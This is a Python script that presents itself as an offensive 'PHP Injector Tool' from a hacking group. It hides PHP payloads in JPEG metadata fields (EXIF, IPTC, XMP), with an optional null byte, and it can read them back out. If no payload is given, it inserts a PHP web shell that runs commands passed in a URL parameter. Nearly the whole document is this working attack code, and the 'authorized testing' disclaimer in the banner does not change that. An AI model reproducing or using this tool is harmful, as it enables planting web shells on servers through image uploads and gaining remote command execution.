import piexif

def print_banner():
    banner = r"""
  ___       _          ____             _       ____      _               
 / _ \  ___| |_ ___   |  _ \  __ _ _ __| | __  / ___|   _| |__   ___ _ __ 
| | | |/ __| __/ _ \  | | | |/ _` | '__| |/ / | |  | | | | '_ \ / _ \ '__|
| |_| | (__| || (_) | | |_| | (_| | |  |   <  | |__| |_| | |_) |  __/ |   
 \___/ \___|\__\___/  |____/ \__,_|_|  |_|\_\  \____\__, |_.__/ \___|_|   
                                                    |___/                 
 ____                            _ 
/ ___|  __ _ _   _  __ _ _ __ __| |
\___ \ / _` | | | |/ _` | '__/ _` |
 ___) | (_| | |_| | (_| | | | (_| |
|____/ \__, |\__,_|\__,_|_|  \__,_|
          |_|                      

    🛠️  Octo Dark Cyber Squad PHP Injector Tool
    👤 Made by: Ariyan Bin Bappy
    ☠️  Group: Octo Dark Cyber Squad
    ⚠️  For authorized testing only
"""
    print(banner)

# Injection Functions
def inject_php_exif_usercomment(image_path, output_path, php_payload, nullbyte_inject=False):
    if nullbyte_inject:
        php_payload += "\x00"
    try:
        exif_dict = piexif.load(image_path)
        user_comment = b"ASCII\x00\x00\x00" + php_payload.encode('ascii', errors='ignore')
        exif_dict["Exif"][piexif.ExifIFD.UserComment] = user_comment
        exif_bytes = piexif.dump(exif_dict)
        piexif.insert(exif_bytes, image_path, output_path)
        print("[+] Injected payload into EXIF UserComment")
    except Exception as e:
        print(f"[-] EXIF UserComment injection failed: {e}")

def inject_php_exif_imagedescription(image_path, output_path, php_payload, nullbyte_inject=False):
    if nullbyte_inject:
        php_payload += "\x00"
    try:
        exif_dict = piexif.load(image_path)
        exif_dict["0th"][piexif.ImageIFD.ImageDescription] = php_payload.encode('ascii', errors='ignore')
        exif_bytes = piexif.dump(exif_dict)
        piexif.insert(exif_bytes, image_path, output_path)
        print("[+] Injected payload into EXIF ImageDescription")
    except Exception as e:
        print(f"[-] EXIF ImageDescription injection failed: {e}")

def inject_php_iptc_caption(image_path, output_path, php_payload):
    try:
        with open(image_path, "rb") as f:
            data = f.read()
        caption_bytes = php_payload.encode('ascii', errors='ignore')
        caption_len = len(caption_bytes)
        if caption_len > 65535:
            print("[-] IPTC Caption too long to inject")
            return
        length_bytes = caption_len.to_bytes(2, byteorder='big')
        iptc_block = b'\x1c\x02\x78' + length_bytes + caption_bytes
        if data[-2:] == b'\xff\xd9':
            new_data = data[:-2] + iptc_block + b'\xff\xd9'
        else:
            new_data = data + iptc_block
        with open(output_path, "wb") as f:
            f.write(new_data)
        print("[+] Injected payload into IPTC Caption block")
    except Exception as e:
        print(f"[-] IPTC Caption injection failed: {e}")

def inject_php_xmp_description(image_path, output_path, php_payload):
    try:
        with open(image_path, "rb") as f:
            data = f.read()
        xmp_packet = (
            b'<x:xmpmeta xmlns:x="adobe:ns:meta/">'
            b'<rdf:RDF xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">'
            b'<rdf:Description rdf:about="" xmlns:dc="http://purl.org/dc/elements/1.1/">'
            b'<dc:description><rdf:Alt><rdf:li xml:lang="x-default">'
            + php_payload.encode('ascii', errors='ignore') +
            b'</rdf:li></rdf:Alt></dc:description>'
            b'</rdf:Description></rdf:RDF></x:xmpmeta>'
        )
        if data[:2] != b'\xff\xd8':
            print("[-] Not a valid JPEG file for XMP injection")
            return
        xmp_header = b'\xff\xe1'
        xmp_identifier = b'http://ns.adobe.com/xap/1.0/\x00'
        xmp_full = xmp_identifier + xmp_packet
        length = len(xmp_full) + 2
        length_bytes = length.to_bytes(2, byteorder='big')
        app1_segment = xmp_header + length_bytes + xmp_full
        new_data = data[:2] + app1_segment + data[2:]
        with open(output_path, "wb") as f:
            f.write(new_data)
        print("[+] Injected payload into XMP Description")
    except Exception as e:
        print(f"[-] XMP Description injection failed: {e}")

def inject_payload(image_path, output_path, php_payload, method="usercomment", nullbyte_inject=False):
    methods = {
        "usercomment": inject_php_exif_usercomment,
        "imagedescription": inject_php_exif_imagedescription,
        "iptc": inject_php_iptc_caption,
        "xmp": inject_php_xmp_description,
    }
    func = methods.get(method.lower())
    if not func:
        print(f"[-] Unknown injection method: {method}")
        return
    if method.lower() in ["usercomment", "imagedescription"]:
        func(image_path, output_path, php_payload, nullbyte_inject)
    else:
        func(image_path, output_path, php_payload)

# Extraction
def extract_php_exif_usercomment(image_path: str):
    try:
        exif_dict = piexif.load(image_path)
        user_comment = exif_dict["Exif"].get(piexif.ExifIFD.UserComment, None)
        if user_comment is None:
            print("[-] No UserComment tag found in EXIF data.")
            return
        if user_comment.startswith(b"ASCII\x00\x00\x00"):
            payload_bytes = user_comment[8:]
            if payload_bytes.endswith(b"\x00"):
                payload_bytes = payload_bytes[:-1]
            try:
                payload = payload_bytes.decode('ascii')
                print("[+] Extracted PHP payload from EXIF UserComment:")
                print(payload)
            except UnicodeDecodeError:
                print("[-] Could not decode payload as ASCII.")
        else:
            print("[-] UserComment does not have ASCII prefix, cannot extract payload reliably.")
    except Exception as e:
        print(f"[-] Error extracting EXIF PHP payload: {e}")

def extract_php_exif_imagedescription(image_path: str):
    try:
        exif_dict = piexif.load(image_path)
        desc = exif_dict["0th"].get(piexif.ImageIFD.ImageDescription, None)
        if desc is None:
            print("[-] No ImageDescription tag found in EXIF data.")
            return
        try:
            payload = desc.decode('ascii') if isinstance(desc, bytes) else desc
            print("[+] Extracted PHP payload from EXIF ImageDescription:")
            print(payload)
        except Exception:
            print("[-] Could not decode ImageDescription tag.")
    except Exception as e:
        print(f"[-] Error extracting EXIF ImageDescription payload: {e}")

# Entry Point
if __name__ == "__main__":
    print_banner()

    print("Choose mode:")
    print("  1 - Inject PHP payload")
    print("  2 - Extract PHP payload from EXIF UserComment")
    print("  3 - Extract PHP payload from EXIF ImageDescription")
    choice = input("Enter choice (1/2/3): ").strip()

    if choice == "1":
        img_in = input("Enter path to the original image file: ").strip()
        img_out = input("Enter output file name (e.g., injected.jpg): ").strip()

        payload = ""
        payload_input = input("Enter PHP payload directly or type 'file' to load from file: ").strip()
        if payload_input.lower() == 'file':
            file_path = input("Enter path to PHP payload file: ").strip()
            try:
                with open(file_path, 'r') as f:
                    payload = f.read().strip()
                    if not payload:
                        print("[-] Payload file is empty.")
                        exit(1)
            except Exception as e:
                print(f"[-] Failed to read file: {e}")
                exit(1)
        else:
            payload = payload_input if payload_input else "<?php if(isset($_GET['cmd'])){system($_GET['cmd']);} ?>"

        print("Injection methods available: usercomment, imagedescription, iptc, xmp")
        method = input("Enter injection method: ").strip().lower()
        nullbyte_inject = False
        if method in ["usercomment", "imagedescription"]:
            nb_choice = input("Enable null byte injection? (y/n): ").strip().lower()
            nullbyte_inject = nb_choice == "y"

        inject_payload(img_in, img_out, payload, method=method, nullbyte_inject=nullbyte_inject)

    elif choice == "2":
        img = input("Enter path to image file: ").strip()
        extract_php_exif_usercomment(img)

    elif choice == "3":
        img = input("Enter path to image file: ").strip()
        extract_php_exif_imagedescription(img)

    else:
        print("[-] Invalid choice. Exiting.")
